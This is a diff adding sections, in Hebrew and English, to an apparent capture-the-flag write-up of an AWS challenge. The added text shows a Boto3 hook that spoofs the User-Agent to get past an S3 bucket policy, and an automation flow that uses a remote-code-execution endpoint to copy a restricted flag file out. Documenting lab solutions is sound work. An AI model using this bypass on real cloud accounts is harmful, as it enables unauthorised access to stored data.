@@ -381,6 +381,32 @@ stage2/ctf_out_capture.txt
 
 ---
 
+## 🤖 10.5. המסלול המתוכנן: Boto3 User-Agent Hooking (`ctf_scripts`)
+
+למרות שהפלאג הושג דרך דלף ב־API (`ctf_out`), **הפתרון המתוכנן** (אשר יושם במלואו בתיקיית `ctf_scripts`) כלל זיוף של כותרת ה־`User-Agent` כדי לעקוף את חסימת ה־Bucket Policy.
+
+בעזרת שימוש ב־event hooks של Boto3 בתוך סביבת ה־Lambda, הצלחנו לזייף את ה־`User-Agent` ל־`aws-cli/2.36.2 (Ubuntu 24; s3.cp / s3.ls)`:
+
+```python
+import boto3
+
+def add_user_agent(request, **kwargs):
+    request.headers["User-Agent"] = "aws-cli/2.36.2 (Ubuntu 24; s3.cp / s3.ls)"
+
+client = boto3.client("s3")
+client.meta.events.register("before-send.s3.*", add_user_agent)
+
+# כעת ניתן לעקוף את המדיניות ולקרוא את הפלאג!
+resp = client.get_object(Bucket="userd8a2f72fe43094e8", Key="flag.txt")
+```
+
+מחזור ההרצה המלא נוהל על ידי `run_all.py`, אשר:
+1. שלח ל־`/dev/code_exec` payloads מקודדים ב־base64 (כגון `get_flag.py`).
+2. הורה ל־Lambda להעתיק את `flag.txt` החסום למפתח נגיש (`exfil-flag.txt`).
+3. משך את האובייקט שחולץ מ־S3 או מ־CloudFront.
+
+---
+
 ## ✅ 11. סיכום
 
 1. Stage 2 נתן RCE מכוון ב־Lambda (`code_exec`) בתוך VPC + גישה ללוגי S3.  
@@ -468,7 +494,33 @@ Saved artifact: `stage2/ctf_out_capture.txt`.
 
 ---
 
+## 6. The Intended Path: Boto3 User-Agent Hooking & Automation (`ctf_scripts`)
+
+While the flag was obtained via an API leak (`ctf_out`), the **intended** solution (fully automated in the `ctf_scripts` directory) involved injecting the correct `User-Agent` to bypass the S3 Bucket Policy restriction.
+
+By utilizing a Boto3 event hook within the Lambda execution environment, we were able to spoof the `User-Agent` header as `aws-cli/2.36.2 (Ubuntu 24; s3.cp / s3.ls)`:
+
+```python
+import boto3
+
+def add_user_agent(request, **kwargs):
+    request.headers["User-Agent"] = "aws-cli/2.36.2 (Ubuntu 24; s3.cp / s3.ls)"
+
+client = boto3.client("s3")
+client.meta.events.register("before-send.s3.*", add_user_agent)
+
+# Now we can bypass the bucket policy and read the flag!
+resp = client.get_object(Bucket="userd8a2f72fe43094e8", Key="flag.txt")
+```
+
+The complete execution lifecycle was managed by `run_all.py`, which:
+1. Hit the `/dev/code_exec` API with base64-encoded payloads (`get_flag.py`, `list_objects.py`, `list_versions.py`).
+2. Instructed the Lambda to copy the restricted `flag.txt` into a new accessible key (`exfil-flag.txt`).
+3. Retrieved the exfiltrated object from S3 or CloudFront.
+
+---
+
 ## ✅ Bottom line
 
 Stage 2 taught a full AWS recon + Lambda RCE + S3 policy story.  
-The submitted flag came from reading `ctf_out.f_value` in the `code_exec` API response during a window when the updated Lambda wrapper exposed it.
+The submitted flag came from reading `ctf_out.f_value` in the `code_exec` API response during a window when the updated Lambda wrapper exposed it, but the intended environment manipulation and strict IAM bypass techniques were fully proven out by the `ctf_scripts` suite.
